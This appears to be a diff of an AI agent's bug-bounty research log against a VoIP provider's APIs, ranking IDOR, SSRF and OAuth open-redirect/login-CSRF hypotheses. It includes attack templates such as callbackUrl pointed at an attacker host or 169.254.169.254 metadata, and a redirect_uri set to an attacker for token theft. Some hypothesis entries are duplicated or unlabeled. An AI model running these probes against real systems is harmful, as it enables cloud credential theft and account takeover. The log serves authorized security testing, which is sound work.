@@ -1474,3 +1474,93 @@ testability: HUMAN_ONLY
 [LEARN] REJECTED MISCONFIG @ *.peoplefone.com: unchanged — 19 guessed subdomains all NXDOMAIN, no wildcard, no dangling CNAME targets; reposcan yields no alternative surface.
 [LEARN] ACCEPTED OTH @ inventory: call-api.peoplefone.com/services/api-doc/ 404 reconfirmed; config-api docs 404 reconfirmed; all 8-spec backends match the 401/404-gated real-backend pattern.
 [RISK] peoplefone GmbH: 82/100 — Sole report-ready finding (OAuth open-redirect/login-CSRF, 00:30 triage VALID 7.4/9.1) still unconfirmed submitted at bugs.olivermaicher.eu (valid-bugs count 0) after 23 frozen cycles. Silent-ATO branch falsified for known clients (confidential secret required); guaranteed impact narrowed to open-redirect+login-CSRF with implicit-flow ATO as HUMAN_ONLY. Configuration IDOR (85) + SSRF (78) remain live behind one bearer token unacquirable agent-side (register 500 persists; 00:30 triage HOLDS both pending token). Entire backlog gated on (a) human report submission and (b) human token acquisition via register recovery — no agent-side action moves risk beyond passive passthrough. Risk drops only on confirmed submission with a valid-bugs increment.
+## 2026-09-08 20:17:32 UTC [target] (model bigpickle)
+[HYP] Command Injection via Unsanitized DNS Lookup Input
+class: SSRF
+asset: peoplefone/mail-validator-mx-server/src/peoplefone/mailValidatorMXServer.php
+confidence: 65
+reasoning: getMXDomains() passes $host (derived from user-supplied email domain) directly
+impact: medium
+verify_steps: 1) Confirm the class is used in any Peoplefone backend service handling
+[HYP] SSRF via Unvalidated MX Server Connection
+class: SSRF
+asset: peoplefone/mail-validator-mx-server/src/peoplefone/mailValidatorMXServer.php
+confidence: 55
+reasoning: getMXConnection() calls fsockopen($host, $this->sock_port, ...) where $host
+impact: medium
+verify_steps: 1) Register a domain with MX record pointing to 169.254.169.254.
+[HYP] Hardcoded Third-Party Provisioning API Endpoints
+class: OTHER
+asset: peoplefone/provisioning-rpc/src/ProvisioningRPCDevice{Auerswald,Gigaset,Panasonic,Snom,Yealink}.php
+confidence: 90
+reasoning: Five device classes contain hardcoded base URIs for external provisioning
+impact: low
+verify_steps: 1) Confirm these endpoints are still live/vendor-operated.
+[HYP] Test File References External Credential File
+class: OTHER
+asset: peoplefone/provisioning-rpc/tests/test.php
+confidence: 40
+reasoning: test.php includes a file at __DIR__.'/../../provisioning-rpc-settings.php'
+impact: info
+verify_steps: 1) Confirm provisioning-rpc-settings.php is never committed in any
+verify_steps: 1) Check all branches/tags for `provisioning-rpc-settings.php` via `git log --all -- 'provisioning-rpc-settings.php'`. 2) If found, extract and check if credentials are live on the hardcoded provisioning endpoints (`https://secure-provisioning.snom.com:8083`, `https://provisioning.e-connecting.net`, `https://prov.gigaset.net`, `https://api-dm.yealink.com:8443`, `https://provisioning.auerswald.de`).
+class: OTHER
+asset: provisioning-rpc/src/ProvisioningRPC.php:9
+confidence: 35
+reasoning: `ProvisioningRPC::connect($model, $login)` builds a class name as `get_class().'Device'.ucfirst(strtolower($model))` and instantiates it with `new $classname($login)`. The `$model` parameter is caller-controlled. While the namespace prefix (`Peoplefone\ProvisioningRPCDevice...`) limits exploitation to classes within that namespace, if the namespace prefix ever expands or autoload is misconfigured, this could allow unintended class instantiation. No concrete exploitation path exists in current code.
+impact: LOW (design concern, no current exploit path)
+verify_steps: Review all callers of `ProvisioningRPC::connect()` to confirm `$model` is never user-supplied without a whitelist. Check that no additional classes exist in the `Peoplefone` namespace that could be instantiated.
+class: SSRF
+asset: provisioning-rpc/src/ProvisioningRPCDevice*.php (all device implementations, `addPhone($mac, $url, ...)`)
+confidence: 25
+reasoning: The `$url` parameter in `addPhone()` is passed directly to third-party provisioning APIs (snom, yealink, panasonic, gigaset, auerswald) without any validation or sanitization in this library. If a consuming application passes user-controlled input to this parameter without validation, it could cause SSRF against those third-party APIs. However, this is a library -- the validation responsibility lies with the consuming application.
+impact: LOW (library-level design; depends on consumer validation)
+verify_steps: Identify all applications consuming this library. Check if `$url` is derived from user input. If so, verify URL allowlisting/ validation exists upstream.
+class: MISCONFIG
+asset: mail-validator-mx-server/src/peoplefone/mailValidatorMXServer.php:241-246
+confidence: 20
+reasoning: `getMXDomains()` calls `exec("nslookup -querytype=mx ".$host, $lines)` and `exec("dig mx ".$host." | grep -v '^;' | grep ".$host, $lines)`. The `$host` is extracted from the email address via `substr($user, strrpos($user,'@')+1)` and sanitized with `preg_replace("/[^a-z0-9\-\.]/", "", strtolower($host))`. The regex only allows `[a-z0-9\-\.]` which prevents shell metacharacter injection. This is effectively mitigated by the strict input validation.
+impact: LOW (mitigated by strict regex sanitization)
+verify_steps: Confirm the regex `/[^a-z0-9\-\.]/` is applied to all code paths reaching `exec()`. No bypass path exists given the character set restriction.
+[CHANGED] reposcan 18:10Z produced no public-org scan (TARGET_ORG not configured) — reposcan continues to yield no alternative in-scope surface; prior library-level leads (mail-validator-mx-server, provisioning-rpc) remain out-of-scope library code with no confirmed deployment in any scoped host, correctly excluded from active set.
+[PRIO] configuration-api.peoplefone.com/customer/voip/v1/{resource}/{identifier},8,9,7,2,6,8,8.3 — unchanged 24 cycles, token-gated (triage HOLD)
+[PRIO] 5 SSRF callback endpoints,8,9,6,2,6,8,7.4 — unchanged, token-gated (triage HOLD)
+[PRIO] auth.peoplefone.com/oauth/authorize,5,7,9,2,6,8,6.6 — open-redirect/login-CSRF VALID 7.4 (9.1 conditional), sole report-ready item, HUMAN_ONLY for ATO
+[HYP] Cross-tenant PBX takeover via Configuration API sequential identifier enumeration (8 resource types)
+class: IDOR
+asset: configuration-api.peoplefone.com/customer/voip/v1/{users,groups,ivrs,queues,numbers,smart-routings,callforwarding,manual-routing}/{identifier}
+confidence: 85
+reasoning: 235KB spec; numeric sequential identifiers; boundary statement "user must be part of account bound to bearer token" but enforcement unproven; UserResponse exposes sipUserName+email+physical address; live 401 gate; cross-model convergence; zero counter-evidence across 24 frozen cycles; triage HOLD pending bearer token
+evidence_needed: tenant-A bearer returns tenant-B {identifier} object via ±1 enumeration
+verify_steps: (authorized, read-only) GET /users, /users/{own_id}, /users/{own_id±1}; repeat /numbers/{did}, /callforwarding/{id}; compare tenant markers
+impact: cross-tenant PBX takeover — SIP creds, PII, DID routing, billing fraud; CRITICAL
+testability: AUTH_HELPED
+[HYP] Cloud metadata/IAM theft via 5 webhook/callback endpoints with zero host/scheme validation
+class: SSRF
+asset: api.peoplefone.com/customer/sms/v1 sms/callbackUrl + call-api smart-routings/{id}/webhook + uaCSTA callbackUrl/monitoringCallbackUrl + configuration-api external-number-lookup webhookUrl
+confidence: 78
+reasoning: format:uri no enum/allowlist across 5 endpoints; External Number Lookup forwards Authorization/X-API-Key to attacker URL; deprecated External Routing (2026-09-30) repeats pattern on weaker path; zero counter-evidence across 24 frozen cycles; triage HOLD pending bearer token
+evidence_needed: post-auth callback reaches attacker host; 169.254.169.254/private ranges unfiltered
+verify_steps: (authorized) POST SMS callbackUrl=https://attacker/x and http://169.254.169.254/latest/meta-data/; inspect attacker-side receipt only
+impact: metadata/IAM theft, internal SIP/PBX pivot, call-metadata leak; CRITICAL
+testability: AUTH_HELPED
+[HYP] OAuth arbitrary redirect_uri / open-redirect + login-CSRF on auth (client_id=1)
+class: AUTH
+asset: auth.peoplefone.com/oauth/authorize (+ /oauth/token)
+confidence: 62
+reasoning: authorize 302→/de_CH/login preserves arbitrary redirect_uri for client_id=1 with implicit+PKCE accepted (warm session); stateless authorize 404 but sets redirect_uri cookie with attacker value; token endpoint enforces client-secret (401 invalid_client clients 1/4/5; nonexistent → 500); code-theft-exchange ATO falsified for known clients; guaranteed primitive = open-redirect+login-CSRF; 00:30 triage VALID 7.4 (9.1 conditional), sole report-ready item
+evidence_needed: warm-session authorize response_type=token + attacker redirect_uri yields access_token fragment; else open-redirect+login-CSRF stands
+verify_steps: (authorized, human) warm portal session; authorize?client_id=1&response_type=token&redirect_uri=attacker; observe fragment; else submit as open-redirect+login-CSRF
+impact: silent ATO of portal users (recordings, CDR, PBX, billing, PII) if implicit; else open-redirect+login-CSRF; CRITICAL conditional
+testability: HUMAN_ONLY
+[PARKED] BUSLOGIC Queue agent login/logout: triage-formal INVALID (spec-silent on membership validation); dropped 7+ cycles, no revival without new spec evidence.
+[PARKED] reposcan library leads (mail-validator-mx-server cmd-inj/SSRF, provisioning-rpc class-instantiation/SSRF): out-of-scope public library code, confidence 20-65, no confirmed deployment in any scoped host — not reportable.
+[FINAL] 1. Configuration API {identifier} CRUD IDOR — 85, AUTH_HELPED, CRITICAL — RETAIN top slot, frozen 24 cycles, token-gated (triage HOLD).
+[FINAL] 2. SSRF 5 callback endpoints incl. header exfil — 78, AUTH_HELPED, CRITICAL — RETAIN, token-gated (triage HOLD).
+[FINAL] 3. OAuth open-redirect/login-CSRF — 62, HUMAN_ONLY, CRITICAL-conditional — RETAIN; sole report-ready item (00:30 triage VALID 7.4/9.1); do not claim silent ATO as guaranteed.
+[NEXT] HUMAN: Submit the OAuth open-redirect/login-CSRF finding to bugs.olivermaicher.eu now — 00:30 triage VALID 7.4 (9.1 conditional), sole report-ready item after 24 frozen cycles. Payload ready: arbitrary redirect_uri preserved 302→/de_CH/login for client_id=1 (warm portal session), implicit+PKCE accepted, redirect_uri cookie (httponly/secure/1yr) set even on stateless 404, code-theft ATO falsified for known confidential clients (1/4/5). Present guaranteed impact as open-redirect+login-CSRF; frame warm-session implicit-flow fragment test as potential silent-ATO escalation, NOT confirmed. Do NOT gate on client-type proof. Separately: when register exits the 500 (re-verified fresh this cycle), mint a genuine portal account → bearer → run IDOR verify_steps `/customer/voip/v1/users ±1` (read-only) and then SSRF callback tests. Agent-side exhausted: register 500 held 24 cycles, full inventory breadth closed, reposcan yields no in-scope surface — no probe adds signal.
+[LEARN] ACCEPTED AUTH @ auth.peoplefone.com: register 500 fresh-reverified this cycle (16:16Z, no cookies) / token 401 known-clients & 500 nonexistent / stateless authorize 404+attacker redirect_uri cookie / api-doc 200 — NO_DELTA; 24th frozen cycle; 00:30 triage VALID on open-redirect/login-CSRF; consistent with prior triage.
+[LEARN] ACCEPTED IDOR @ configuration-api {identifier} CRUD: no counter-evidence; rank holds; token-gated (24th frozen cycle); triage HOLD pending bearer token.
+[LEARN] ACCEPTED SSRF @ 5 callback endpoints: no counter-evidence; retained pending token (24th frozen cycle); triage HOLD.
+[LEARN] REJECTED MISCONFIG/OTHER @ repo scan: reposcan 18:10Z returns no public-org scan (TARGET_ORG unconfigured); library-level leads (mail-validator-mx-server, provisioning-rpc) are out-of-scope code, not scoped hosts, no deployment evidence — no in-scope alternative surface.
+[RISK] peoplefone GmbH: 82/100 — Unchanged. Sole report-ready finding (OAuth open-redirect/login-CSRF, triage VALID 7.4/9.1) still not confirmed submitted at bugs.olivermaicher.eu (valid-bugs count 0) after 24 frozen cycles. Silent-ATO branch falsified for known confidential clients; guaranteed impact narrowed to open-redirect+login-CSRF. Configuration IDOR (85) + SSRF (78) remain live behind a bearer token unacquirable agent-side (register 500 re-verified fresh this cycle; both triage HOLDS pending token). Entire backlog gated on (a) human report submission and (b) human token acquisition via register recovery — no agent-side action moves risk. Risk drops only on confirmed submission with a valid-bugs increment.
